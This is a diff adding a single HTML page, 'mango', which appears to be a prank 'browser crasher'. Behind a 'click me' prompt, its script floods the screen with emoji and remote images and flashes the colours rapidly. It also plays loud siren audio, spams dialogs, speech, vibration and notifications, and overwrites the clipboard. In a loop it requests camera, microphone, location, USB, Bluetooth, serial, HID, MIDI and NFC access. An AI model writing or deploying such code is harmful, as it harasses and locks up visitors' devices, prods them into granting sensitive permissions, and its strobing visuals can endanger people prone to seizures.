@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>mango</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="mango">
+<meta property="og:description" content="mango">
+<meta property="og:url" content="https://YOUR-LINK-HERE">
+<link id="a" rel="icon">
+<style>
+html,body{
+  margin:0;
+  padding:0;
+  width:100%;
+  height:100%;
+  background:white;
+  overflow:hidden;
+  font-family:sans-serif;
+  touch-action:none;
+}
+.b{
+  position:absolute;
+  pointer-events:none;
+  will-change:transform,opacity;
+}
+.c{animation:c 0.05s infinite;}
+@keyframes c{
+  0%{transform:translate(0,0)}
+  20%{transform:translate(12px,12px)}
+  40%{transform:translate(-12px,12px)}
+  60%{transform:translate(12px,-12px)}
+  80%{transform:translate(-12px,-12px)}
+  100%{transform:translate(0,0)}
+}
+#d{
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  font-size:200px;
+  pointer-events:all;
+  cursor:pointer;
+  z-index:9999;
+  user-select:none;
+  text-align:center;
+}
+#d:hover{ font-size:220px; }
+</style>
+</head>
+<body>
+<div id="d">🥭<br><small>touch / click me for mango overload</small></div>
+<audio id="e" src="https://random.getunx.cc/Assets/2c0e8675dda2864abf408e6202e82ae7.mp3" loop preload="auto"></audio>
+<audio id="f" src="https://assets.mixkit.co/sfx/preview/mixkit-siren-alert-1003.mp3" loop preload="auto"></audio>
+
+<script>
+const g = "https://api-gatostuff.vercel.app/raw/assets/randasset/";
+const h = [
+"img/01dbc1adc829dc3554cce431b1a8f3a6.jpg",
+"img/0235d48ad3fe45089783ddc92521aee3.jpg",
+"img/10691eb4709bcd5d8d3b17b031787164.jpg",
+"img/1226e84d2281a615098ad9457322b835.jpg",
+"img/338c9a7da8e176ddda0230c5ed26c278.jpg",
+"img/382972517045017670381c47a855d117.jpg",
+"img/5eb1c885de312465426aab90922d1607.jpg",
+"img/77fb4a1a5d1d6f930cb3ab91ca496cf7.jpg",
+"img/ae3a9b118c69688003b3a801346375a8.jpg",
+"img/c4d3698100293c74f2e6c9ef79657fb1.jpg",
+"img/dd45dd8f97930fbc089c9fb96af2993f.jpg",
+"img/df41ad14d190ebb715118fad3cceea9b.jpg",
+"img/e3b6e03fcba8fc463aca060613887543.jpg",
+"img/fd299b7208eb82e3f11a37e229424cd5.jpg",
+"img/new/07fdbae994fc0853a3a26482de71c208.jpg",
+"img/new/0bf53e3a8a81aba22c1abaa0fe4473a2.jpg",
+"img/new/31809a21a15ac4d69e27f16bee442847.jpg",
+"img/new/358dac5dfc20597f031364ebdbc79923.jpg",
+"img/new/38b554644470c1230377ce5026b07e4f.jpg",
+"img/new/3f0cf53d95cd22067e9b8505b95e6819.jpg",
+"img/new/4213e020870ba761bf9dc846ada0fcd4.jpg",
+"img/new/4241e30c111f61137078f88f5e4c21a3.jpg",
+"img/new/5bbeef93932c653ea109a4e25f3e952d.jpg",
+"img/new/b48d5d28b79a6c4e016c16a4adc97a28.jpg",
+"img/new/c2e43058773fe881dc9b6d69cf2c3b26.jpg",
+"img/new/d55141fb0f0d38fa48ed28990a3f1444.jpg",
+"img/new/fdd0e7417d6a29d55a74faedf3d8227f.jpg",
+"img/new/ab67706c0000da84543376851c32c04b6585c58a.jpg",
+"img/new/22982-optimized_3.jpg",
+"img/new/new/1e363ce7a0fb0aa74825974db3e24ad3.jpg",
+"img/new/new/20251222_212232.jpg",
+"img/new/new/2093722fa6cdd64fe3e52d2db544341f.jpg",
+"img/new/new/22982-optimized_3.jpg",
+"img/new/new/2540e4b227b3d7c49345ab17a0ade7f8.jpg",
+"img/new/new/2de36e3ec3792d86690a1e043b1efd52.jpg",
+"img/new/new/49311984170dc4231fc818cf5f5d0b59.jpg",
+"img/new/new/5515d863fdb72b36af49a0bf16d1c673.jpg",
+"img/new/new/5a460942913dc4084ce4baaa62380c7b.jpg",
+"img/new/new/62b2df65e381565589b8a39e55f42354.jpg",
+"img/new/new/6affc6af61f2f519374827fc8f9adbdf.jpg",
+"img/new/new/936f2a86fa632156d9ff6ccf10621a0f.jpg",
+"img/new/new/ab67706c0000da84543376851c32c04b6585c58a.jpg",
+"img/new/new/bc6bcd64bf1eda900f3123789be76ac1.jpg",
+"img/new/new/befdb7e0ffe3d8dd15a3e32b8faf48b7.jpg",
+"img/new/new/bigrat.jpg",
+"img/new/new/c0fad5ae6ec49a602b5d6b47053f46c2.jpg",
+"img/new/new/cc6f15522c73d4a4fbfb5a7a891ede32.jpg",
+"img/new/new/d443b6dcf31d461b58f364644dfe8c44.jpg",
+"img/new/new/ec602e4cef130dd87ecdf1555b842f73.jpg",
+"img/new/new/ed3d934953a854dbc7aa17de659e20d2.jpg",
+"img/new/new/ef87368f834a1da0e807c70ff823b550.jpg",
+"img/new/new/fc24a829a5e77cc52c3029a6c7cbcc72.jpg",
+"img/new/new/fcec3e2f942c6936461ade178c11ddb5.jpg",
+"img/new/new/Screenshot_20251222_071538_Gallery.png",
+"img/new/new/Screenshot_20251224_215914_Discord.png",
+"img/new/new/new/4f1ec7ce503d42905171b68fc82bec7d.jpg",
+"img/new/new/new/5f38978dd61119110f1d423d92398740.jpg",
+"img/new/new/new/6349c1e789e74233797cd23845133357.jpg",
+"img/new/new/new/755e8aa6e0d73190f3c6a695fa7f825d.jpg",
+"img/new/new/new/7f1541e5d582c1a8e90dededf5b4049c.jpg",
+"img/new/new/new/983f2bcb4293360d41badac2bf330265.jpg",
+"img/new/new/new/aa973713d6822b847485333b394af9f6.jpg",
+"img/new/new/new/c5301b63258dbd1421f54cc2adbc9202.jpg",
+"img/new/new/new/e145f4a931e12592334e6b90960332e1.jpg",
+"img/new/new/new/e387aff0b8b15b551d3e82b6e7e7a8fa.jpg",
+"img/new/new/new/e6006bf694e6f65bb18f83f24686101f.jpg",
+"img/new/new/new/images (95).jpeg"
+];
+
+const i = ["👶","👶🏻","👶🏼","👶🏽","👶🏾","👶🏿"];
+
+function j(){
+  const k = Math.random();
+  if (k < 0.4) return "🥭".repeat(20 + Math.floor(Math.random()*80));
+  if (k < 0.8) {
+    let l = "";
+    for(let m=0;m<30+Math.floor(Math.random()*70);m++) l += i[Math.floor(Math.random()*i.length)];
+    return l;
+  }
+  let l = "";
+  for(let m=0;m<40+Math.floor(Math.random()*100);m++) {
+    const n = 0x20 + Math.floor(Math.random() * (0xFFFF - 0x20));
+    l += String.fromCharCode(n);
+  }
+  return l;
+}
+
+function o(){
+  const p = Math.random();
+  if (p < 0.33) alert(j());
+  else if (p < 0.66) confirm(j());
+  else prompt(j(), "🥭");
+}
+
+function q(){
+  const r = document.createElement("div");
+  r.textContent = "🥭";
+  r.className = "b";
+  r.style.fontSize = (Math.random()*220 + 40) + "px";
+  r.style.opacity = (Math.random()*0.9+0.1).toString();
+  r.style.left = Math.random()*(innerWidth-120) + "px";
+  r.style.top = Math.random()*(innerHeight-120) + "px";
+  r.style.transform = `rotate(${Math.random()*1080-540}deg)`;
+  return r;
+}
+
+function s(){
+  const t = document.createElement("img");
+  t.className = "b";
+  t.src = g + h[Math.floor(Math.random()*h.length)];
+  t.style.width = (Math.random()*600 + 100) + "px";
+  t.style.opacity = (Math.random()*0.9+0.1).toString();
+  t.style.left = Math.random()*(innerWidth-140) + "px";
+  t.style.top = Math.random()*(innerHeight-140) + "px";
+  t.style.transform = `rotate(${Math.random()*1080-540}deg)`;
+  return t;
+}
+
+function u(){
+  for(let v=0;v<5+Math.floor(Math.random()*5);v++){
+    const w = Math.random() < 0.65 ? q() : s();
+    document.body.appendChild(w);
+    setTimeout(()=>{ try{ w.remove() }catch(e){} }, 3000);
+  }
+}
+
+function x(){
+  const y = Math.random();
+  if (y < 0.4) {
+    let z = "";
+    for (let aa = 0; aa < 30 + Math.floor(Math.random()*50); aa++) {
+      z += i[Math.floor(Math.random()*i.length)];
+    }
+    document.title = z;
+  } else if (y < 0.8) {
+    document.title = "🥭".repeat(20 + Math.floor(Math.random()*40));
+  } else {
+    let z = "";
+    for (let aa = 0; aa < 60 + Math.floor(Math.random()*80); aa++) {
+      z += Math.random() < 0.5 ? "I" : "l";
+    }
+    document.title = z;
+  }
+}
+
+function ab(){
+  const ac = document.createElement("canvas");
+  ac.width = ac.height = 32;
+  const ad = ac.getContext("2d");
+  ad.clearRect(0,0,32,32);
+  ad.font = "30px serif";
+  ad.fillText("🥭", 0, 30);
+  document.getElementById("a").href = ac.toDataURL();
+}
+
+const ae = ["#fff","#eee","#ffdd99","#ffaa00","#ff6600","#ffff00","#ff8800","#ff0000","#00ff00","#0000ff"];
+function af(){
+  document.body.style.background = ae[Math.floor(Math.random()*ae.length)];
+}
+
+function ag(){
+  const ah = [
+    `hue-rotate(\( {Math.random()*360}deg) saturate( \){1+Math.random()*5})`,
+    `invert(${Math.random()<0.4?1:0})`,
+    `blur(${Math.random()*4}px)`,
+    `contrast(\( {1+Math.random()*4}) brightness( \){0.3+Math.random()*2})`
+  ];
+  document.body.style.filter = ah.join(" ");
+}
+
+function ai(){
+  if(navigator.vibrate) navigator.vibrate([50,15,50,15,50,15,50,15,50]);
+}
+
+function aj(){ try{ window.focus(); }catch(e){} }
+
+function ak(){
+  if("speechSynthesis" in window){
+    const al = new SpeechSynthesisUtterance(j());
+    al.rate = 0.3 + Math.random()*3;
+    al.pitch = Math.random()*2;
+    al.volume = 1;
+    speechSynthesis.speak(al);
+  }
+}
+
+let am = 0;
+function an() {
+  am++;
+  if (am % 10 === 0 && Notification.permission === "granted") {
+    try {
+      const ao = document.createElement("canvas");
+      ao.width = ao.height = 128;
+      const ap = ao.getContext("2d");
+      ap.font = "100px serif";
+      ap.fillText("🥭", 10, 100);
+      const aq = ao.toDataURL();
+      new Notification("🥭", { body: "🥭", icon: aq });
+    } catch(e) {}
+  }
+}
+
+let ar = null;
+async function as() {
+  if (navigator.requestMIDIAccess) {
+    try { ar = await navigator.requestMIDIAccess(); } catch(e) {}
+  }
+}
+function at() {
+  if (!ar || ar.outputs.size === 0) return;
+  const au = Array.from(ar.outputs.values());
+  au.forEach(av => {
+    for (let aw = 0; aw < 25; aw++) {
+      const ax = Math.floor(Math.random() * 16);
+      const ay = 20 + Math.floor(Math.random() * 80);
+      const az = 100 + Math.floor(Math.random() * 28);
+      av.send([0x90 + ax, ay, az]);
+      setTimeout(() => av.send([0x80 + ax, ay, 0]), 8 + Math.random() * 25);
+    }
+  });
+}
+
+async function ba() {
+  if ("NDEFReader" in window) {
+    try {
+      const bb = new NDEFReader();
+      await bb.scan();
+      setInterval(async () => {
+        try { await bb.write("🥭".repeat(100)); } catch(e) {}
+      }, 400);
+    } catch(e) {}
+  }
+}
+
+async function bc() {
+  let bd = 0;
+  const be = 120;
+
+  setTimeout(() => { if ("Notification" in window) Notification.requestPermission().catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(async () => { await as(); }, bd);
+  bd += be;
+  setTimeout(() => { if (navigator.mediaDevices?.getUserMedia) navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(bf => bf.getTracks().forEach(bg => bg.stop())).catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { if (navigator.clipboard) { navigator.clipboard.writeText("🥭".repeat(1000)).catch(()=>{}); navigator.clipboard.readText().catch(()=>{}); } }, bd);
+  bd += be;
+  setTimeout(() => { if ("wakeLock" in navigator) navigator.wakeLock.request('screen').catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { document.documentElement.requestFullscreen?.().catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { document.body.requestPointerLock?.(); }, bd);
+  bd += be;
+  setTimeout(() => { ba(); ba(); ba(); ba(); ba(); ba(); ba(); ba(); ba(); ba(); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.bluetooth?.requestDevice({acceptAllDevices:true}).catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.usb?.requestDevice({filters:[]}).catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.serial?.requestPort().catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.hid?.requestDevice({filters:[]}).catch(()=>{}); }, bd);
+}
+
+const bh = document.getElementById("e");
+const bi = document.getElementById("f");
+function bj() {
+  bh.play().catch(()=>{});
+  bi.play().catch(()=>{});
+  bh.volume = bi.volume = 0.9 + Math.random()*0.1;
+  bh.playbackRate = bi.playbackRate = 0.7 + Math.random()*1.2;
+}
+
+document.body.classList.add("c");
+setInterval(u, 40);
+setInterval(x, 40);
+setInterval(ab, 50);
+setInterval(af, 25);
+setInterval(ag, 150);
+
+const bk = ["click","touchstart","touchmove","mousedown","keydown","scroll","wheel","mousemove"];
+bk.forEach(bl => {
+  document.addEventListener(bl, () => {
+    bc();
+    bj();
+    at();
+    an();
+    ak();
+
+    const bm = document.getElementById("d");
+    if (bm) bm.remove();
+
+    setInterval(u, 6);
+    setInterval(ai, 80);
+    setInterval(aj, 120);
+    setInterval(an, 600);
+    setInterval(at, 60);
+    setInterval(ak, 300);
+    setInterval(o, 20000);
+  }, {passive: false});
+});
+
+setInterval(an, 600);
+setInterval(at, 60);
+setInterval(bj, 400);
+setInterval(x, 25);
+setInterval(ak, 400);
+setInterval(o, 30000);
+setInterval(bc, 1000);
+setInterval(ai, 100);
+
+bc();
+bj();
+
+</script>
+</body>
+</html>
